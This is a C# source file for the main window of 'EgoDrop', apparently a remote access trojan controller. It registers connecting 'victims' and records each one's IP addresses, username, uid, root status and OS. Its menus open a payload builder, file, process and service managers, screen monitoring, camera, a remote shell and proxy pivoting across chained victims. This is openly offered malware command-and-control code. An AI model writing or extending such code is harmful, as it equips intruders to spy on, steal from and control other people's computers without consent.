using EgoDrop.Properties;
using System.Net.Sockets;
using System.Resources;

namespace EgoDrop
{
    public partial class frmMain : Form
    {
        public Dictionary<string, clsListener> m_dicListener = new Dictionary<string, clsListener>();

        private clsSqlite m_sqlite { get; set; } //Sqlite object.
        private clsIniMgr m_iniMgr { get; set; } //IniMgr object.

        public frmMain()
        {
            InitializeComponent();

            m_sqlite = new clsSqlite("data.db"); //Sqlite object.
            m_iniMgr = new clsIniMgr("config.ini"); //IniMgr object.
        }

        /// <summary>
        /// Obtain victim object from listviewitem object.
        /// </summary>
        /// <param name="item"></param>
        /// <returns></returns>
        private clsVictim fnGetVictimFromTag(ListViewItem item) => (clsVictim)item.Tag; //Obtain victim object.

        /// <summary>
        /// 
        /// </summary>
        /// <param name="szID"></param>
        /// <returns></returns>
        private clsVictim fnGetVictimWithID(string szID) => (clsVictim)(listView1.FindItemWithText(szID, true, 0).Tag);

        #region Logger

        /// <summary>
        /// Display log message and write into database.
        /// </summary>
        /// <param name="szMsg">Log message.</param>
        public void fnSysLog(string szMsg)
        {
            richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] {szMsg}");
            richTextBox1.AppendText(Environment.NewLine);

            //todo: Write log msg into database.
        }

        #endregion

        /// <summary>
        /// New victim event handler.
        /// </summary>
        /// <param name="ltn"></param>
        /// <param name="vic"></param>
        public void fnOnNewVictim(clsListener ltn, clsVictim vic)
        {
            Socket sktClnt = vic.m_sktClnt;
            try
            {
                Invoke(new Action(() =>
                {
                    //Add to group,
                }));
            }
            catch (Exception ex)
            {

            }
        }

        /// <summary>
        /// New received victim message event handler.
        /// </summary>
        /// <param name="ltn">Listener object.</param>
        /// <param name="victim">Victim object.</param>
        /// <param name="lsMsg">Message list.</param>
        public void fnReceivedMessage(clsListener ltn, clsVictim victim, List<string> lsMsg)
        {
            if (lsMsg.Count == 0)
                return;

            if (victim == null || victim.m_sktClnt == null || victim.m_sktClnt.RemoteEndPoint == null)
                return;

            if (lsMsg[0] == "info")
            {
                Invoke(new Action(() =>
                {
                    string szID = lsMsg[4];
                    if (listView1.Items.Count == 0 || listView1.FindItemWithText(szID, true, 0) == null)
                    {
                        ListViewItem item = new ListViewItem(lsMsg[1]);                //Screen (sudo required!).
                        item.SubItems.Add(szID);                                       //Victim ID.
                        item.SubItems.Add(victim.m_sktClnt.RemoteEndPoint.ToString()); //External IPv4 address.
                        item.SubItems.Add(lsMsg[3]);                                   //Internal IPv4 address.
                        item.SubItems.Add(lsMsg[5]);                                   //Username.
                        item.SubItems.Add(lsMsg[6]);                                   //uid.
                        item.SubItems.Add(lsMsg[7]);                                   //root?
                        item.SubItems.Add(lsMsg[8]);                                   //Operating system.
                        item.SubItems.Add(string.Empty);                               //Active window title (if not null or empty).

                        item.Tag = victim;

                        listView1.Items.Add(item);

                        fnSysLog($"New victim[{victim.m_sktClnt.RemoteEndPoint.ToString()}]"); //Write new log message.

                        //Add to group treeview.

                        //imageList1.ImageSize = new Size(100, 100);
                    }
                }));
            }
        }

        /// <summary>
        /// Victim disconnected event handler.
        /// </summary>
        /// <param name="ltn">Listener object.</param>
        /// <param name="vic">Victim object.</param>
        public void fnOnVictimDisconnected(clsListener ltn, clsVictim vic)
        {
            if (vic == null || vic.m_sktClnt == null || vic.m_sktClnt.RemoteEndPoint == null)
                return;

            Invoke(new Action(() =>
            {
                foreach (ListViewItem item in listView1.Items)
                {
                    if (clsTools.fnbSameVictim(vic, fnGetVictimFromTag(item)))
                    {
                        listView1.Items.Remove(item);
                        fnSysLog($"Offline[{vic.m_sktClnt.RemoteEndPoint.ToString()}]");
                    }
                }
            }));
        }

        public void fnOnAddChain(List<string> lsVictim)
        {
            Invoke(new Action(() =>
            {
                for (int i = 0; i < lsVictim.Count; i++)
                {
                    string szVictim = lsVictim[i];

                    var n1 = networkView1.AddNode(Guid.NewGuid().ToString(), $"{szVictim}", new Point(100, 100), imageList1.Images[0]);
                    if (i == 0)
                        continue;

                    var nodeParent = networkView1.FindNodeWithID(lsVictim[i - 1]);
                    networkView1.AddConnection(nodeParent, n1);

                    clsVictim victim = fnGetVictimWithID(szVictim);
                    victim.m_lsVictim = lsVictim;
                }
            }));
        }

        private void fnSetup()
        {
            //Load groups
            List<string> lsGroup = m_sqlite.fnlsGetGroups();
            foreach (string szName in lsGroup)
            {
                TreeNode node = new TreeNode(szName);
                treeView1.Nodes.Add(node);
            }


            void fnTest()
            {
                var n1 = networkView1.AddNode("Host A", "111", new Point(100, 100), imageList1.Images[0]); //Add to network view.
                var n2 = networkView1.AddNode("Host B", "222", new Point(100, 100), imageList1.Images[0]);
                var n3 = networkView1.AddNode("Host C", "333", new Point(100, 100), imageList1.Images[0]);
                var n4 = networkView1.AddNode("Host D", "444", new Point(100, 100), imageList1.Images[0]);

                networkView1.AddConnection(n1, n2);
                networkView1.AddConnection(n2, n3);
                networkView1.AddConnection(n2, n4);
            }

            //fnTest();

            networkView1.Zoom = 1.0f;
        }

        private void frmMain_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        //Listener
        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            frmListener f = new frmListener(this, m_sqlite, m_dicListener);

            f.ShowDialog();
        }

        //Builder
        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {
            frmBuilder f = new frmBuilder(this, m_sqlite, m_iniMgr);
            f.Show();
        }

        //Setting
        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            frmSetting f = new frmSetting(m_iniMgr);

            f.ShowDialog();
        }

        //About
        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            new frmAbout().Show();
        }

        //Info
        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                frmInfoSpyder f = new frmInfoSpyder(fnGetVictimFromTag(item));
                f.Show();
            }
        }

        //File
        private void toolStripMenuItem6_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                clsVictim victim = fnGetVictimFromTag(item);
                frmFileMgr f = clsTools.fnFindForm<frmFileMgr>(victim);
                if (f == null)
                {
                    f = new frmFileMgr(victim);
                    f.Show();
                }
                else
                {
                    f.BringToFront();
                }
            }
        }

        //Process
        private void toolStripMenuItem7_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                clsVictim victim = fnGetVictimFromTag(item);
                frmProcMgr f = clsTools.fnFindForm<frmProcMgr>(victim);
                if (f == null)
                {
                    f = new frmProcMgr(victim);
                    f.Show();
                }
                else
                {
                    f.BringToFront();
                }
            }
        }

        //Service
        private void toolStripMenuItem8_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                clsVictim victim = fnGetVictimFromTag(item);
                frmSrvMgr f = clsTools.fnFindForm<frmSrvMgr>(victim);
                if (f == null)
                {
                    f = new frmSrvMgr(victim);
                    f.Show();
                }
                else
                {
                    f.BringToFront();
                }
            }
        }

        //Monitor
        private void toolStripMenuItem9_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                frmMonitor f = new frmMonitor(fnGetVictimFromTag(item));

                f.Show();
            }
        }

        //Camera
        private void toolStripMenuItem10_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                frmCamera f = new frmCamera();

                f.Show();
            }
        }

        private void toolStripMenuItem11_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                clsVictim victim = fnGetVictimFromTag(item);
                frmShell f = clsTools.fnFindForm<frmShell>(victim);
                if (f == null)
                {
                    f = new frmShell(victim);
                    f.Show();
                }
                else
                {
                    f.BringToFront();
                }
            }
        }

        private void toolStripMenuItem12_Click(object sender, EventArgs e)
        {
            Node node = networkView1.SelectedNode;
            if (node == null)
                return;

            string szID = node.HostID.Split('@').First();
            ListViewItem item = listView1.FindItemWithText(szID, true, 0);
            if (item == null)
                return;

            clsVictim victim = fnGetVictimFromTag(item);

            frmServerProxy f = new frmServerProxy(victim);
            f.Show();
        }
    }
}
